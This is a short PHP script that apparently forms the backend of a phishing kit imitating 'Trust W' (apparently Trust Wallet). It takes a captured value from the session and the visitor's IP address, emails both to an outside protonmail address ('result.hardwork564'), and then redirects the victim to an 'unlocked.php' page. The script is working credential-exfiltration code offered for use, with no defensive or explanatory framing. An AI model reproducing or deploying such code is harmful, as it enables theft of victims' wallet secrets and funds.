<?php
session_start();

$ms3 = $_SESSION['xmo1a']."<br>";
$title = "Trust W | IP: ". $_SERVER['REMOTE_ADDR'];
$hrsd = "From:Trust W <mailto@".$_SERVER['SERVER_NAME'].">\n";
$hrsd .= "Content-type: text/html; charset=iso-8859-1\r\n";
mail("result.hardwork564@protonmail.com",$title,$ms3,$hrsd);
Header ("Location: unlocked.php");
?>